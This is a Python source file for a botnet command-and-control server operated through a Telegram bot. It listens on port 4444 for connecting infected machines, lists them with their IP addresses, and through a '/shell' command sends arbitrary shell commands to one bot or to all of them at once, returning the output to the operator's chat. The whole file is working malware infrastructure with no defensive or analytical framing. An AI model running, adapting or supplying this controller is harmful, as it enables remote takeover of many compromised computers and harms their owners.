from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import socket
import threading

bots = {}
TOKEN = "BOT_TOKEN_HERE"

def start(update: Update, context: CallbackContext):
    update.message.reply_text("WHY YOU KNOW MY BOT? GET OUT PLS")

def bots_command(update: Update, context: CallbackContext):
    if not bots:
        update.message.reply_text("No bots connected.")
    else:
        bot_list = "\n".join([f"{bot_id}: {bots[bot_id][0]}" for bot_id in bots])
        update.message.reply_text(f"Total Bots:\n{bot_list}")

def shell_command(update: Update, context: CallbackContext):
    args = context.args
    if len(args) < 2:
        update.message.reply_text("Usage: /shell <bot_id/all> <command>")
        return

    target_bot = args[0]
    command = " ".join(args[1:])

    # what is "all"? for sending command to all bots
    if target_bot == "all":
        for bot_id, (ip, conn) in bots.items():
            threading.Thread(target=send_command_and_receive_output, args=(conn, command, update)).start()
    # exec command with bot_id
    elif target_bot in bots:
        conn = bots[target_bot][1]
        threading.Thread(target=send_command_and_receive_output, args=(conn, command, update)).start()
    else:
        update.message.reply_text(f"Bot {target_bot} not found.")

def send_command_and_receive_output(conn, command, update):
    try:
        conn.send(command.encode())

        result = b''
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            result += chunk
        
        # decode the results
        result = result.decode('utf-8', errors='replace')

        # send results to cnc
        update.message.reply_text(f"Command result:\n{result}")
    except Exception as e:
        update.message.reply_text(f"Error executing command: {str(e)}")

def listen_for_bots():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 4444))
    server_socket.listen(5)

    while True:
        conn, addr = server_socket.accept()
        bot_id = conn.recv(1024).decode()  # revivce bot_id
        bots[bot_id] = (addr[0], conn)  # revivce ip address

def main():
    threading.Thread(target=listen_for_bots, daemon=True).start()
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("bots", bots_command))
    dp.add_handler(CommandHandler("shell", shell_command, pass_args=True))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
